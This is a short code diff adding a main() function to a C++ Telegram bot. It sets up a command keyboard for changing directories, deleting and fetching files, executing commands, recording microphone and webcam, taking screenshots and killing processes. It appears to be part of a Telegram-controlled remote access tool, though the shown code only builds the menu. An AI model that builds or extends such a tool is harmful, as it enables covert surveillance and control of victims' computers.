@@ -63,3 +63,22 @@ string GetInfoCmd()
 
     return info;
 }
+
+int main() {
+    Bot bot("your token");
+
+    /*ReplyKeyboardMarkup::Ptr keyboardOneCol(new ReplyKeyboardMarkup);
+    createOneColumnKeyboard({ "Option 1", "Option 2", "Option 3" }, keyboardOneCol);*/
+
+    ReplyKeyboardMarkup::Ptr keyboardWithLayout(new ReplyKeyboardMarkup); // Создание клавиатуры тг бота
+    createKeyboard({
+        {"/cd", "/chdir", "/dir", "/rm_file"},
+        {"/get_file", "/exec_cmd"},
+        {"/rec_micro", "/get_audio"},
+        {"/rec_video", "/get_video"},
+        {"/screenshot", "/get_screen"},
+        {"/taskill", "/tasklist"}
+        }, keyboardWithLayout);
+
+    string last_cmd = "";
+}
